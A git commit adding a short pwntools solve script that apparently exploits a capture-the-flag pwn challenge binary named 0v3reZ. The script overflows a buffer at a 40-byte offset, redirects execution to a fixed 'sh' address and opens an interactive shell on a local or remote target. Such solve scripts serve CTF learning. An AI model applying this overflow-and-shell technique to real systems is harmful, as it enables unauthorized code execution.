0e6e3a2d22b8c8e5a0e27e2bf04f76680ad202b1
Mark Uche <113513376+markuched13@users.noreply.github.com>
2023-02-18 22:47:18 +0100

    Create 0v3reZ.py

---
+++ solvescript/sabr/pwn/0v3reZ.py
@@ -0,0 +1,50 @@
+from pwn import *
+
+
+# Allows you to switch between local/GDB/remote from terminal
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ('server', 'port')
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
+
+
+# Specify GDB script here (breakpoints etc)
+gdbscript = '''
+init-pwndbg
+continue
+'''.format(**locals())
+
+# Binary filename
+exe = './0v3reZ'
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF(exe, checksec=False)
+# Change logging level to help with debugging (error/warning/info/debug)
+context.log_level = 'info'
+
+# ===========================================================
+#                    EXPLOIT GOES HERE
+# ===========================================================
+
+# Start program
+io = start()
+
+offset = 40
+sh = 0x004011de
+
+# Build the payload
+payload = flat({
+    offset: [
+        sh,
+
+    ]
+})
+
+# Send the payload
+io.sendline(payload)
+
+# Got Shell?
+io.interactive()
+                
